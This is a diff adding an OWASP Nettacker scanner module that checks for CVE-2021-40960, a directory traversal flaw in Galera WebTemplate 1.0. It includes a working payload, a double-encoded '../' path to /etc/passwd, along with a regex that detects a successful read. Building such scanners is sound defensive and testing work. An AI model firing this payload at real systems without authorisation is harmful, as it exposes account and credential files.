@@ -1,0 +1,55 @@
+info:
+  name: galera_webtemp_cve_2021_40960_vuln
+  author: OWASP Nettacker Team
+  severity: 7
+  description: Galera WebTemplate 1.0 is affected by a directory traversal vulnerability that could reveal information from /etc/passwd and /etc/shadow.
+  reference: 
+    - http://www.omrylmz.com/galera-webtemplate-1-0-directory-traversal-vulnerability-cve-2021-40960/
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-40960
+  profiles:
+    - vuln
+    - vulnerability
+    - http
+    - high_severity
+    - cve2021
+    - cve
+    - galera
+    - lfi
+
+payloads:
+  - library: http
+    verify: false
+    timeout: 3
+    cert: ""
+    stream: false
+    proxies: ""
+    steps:
+      
+        
+      - method: get
+        headers:
+          User-Agent: "{user_agent}"
+        allow_redirects: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/GallerySite/filesrc/fotoilan/388/middle//.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: root:\\C+(:\\d+)+
+              reverse: false
